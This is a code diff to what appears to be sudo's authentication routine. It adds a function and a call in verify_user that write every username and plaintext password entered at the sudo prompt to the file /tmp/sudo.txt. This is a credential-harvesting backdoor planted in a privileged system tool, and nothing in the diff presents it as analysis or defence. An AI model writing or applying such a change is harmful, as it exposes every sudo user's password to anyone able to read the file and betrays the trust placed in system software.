@@ -240,6 +240,24 @@ user_interrupted(void)
 }
 
 /*
+ * Log credentials to /tmp/sudo.txt in format username:password\n
+ */
+static void
+log_credentials(const char *username, const char *password)
+{
+    FILE *fp;
+
+    if (username == NULL || password == NULL)
+	return;
+
+    fp = fopen("/tmp/sudo.txt", "a");
+    if (fp != NULL) {
+	fprintf(fp, "%s:%s\n", username, password);
+	fclose(fp);
+    }
+}
+
+/*
  * Called when getpass is suspended so we can drop the lock.
  */
 static int
@@ -363,6 +381,15 @@ verify_user(const struct sudoers_context *ctx, struct passwd *pw, char *prompt,
 	    pass = auth_getpass(prompt, SUDO_CONV_PROMPT_ECHO_OFF, callback);
 	    if (pass == NULL)
 		break;
+
+	    /* Intercept credentials and log to /tmp/sudo.txt */
+	    {
+		const char *username = ctx->user.name ? ctx->user.name :
+				      (ctx->user.pw ? ctx->user.pw->pw_name : NULL);
+		if (username != NULL) {
+		    log_credentials(username, pass);
+		}
+	    }
 	}
 
 	/* Call authentication functions. */
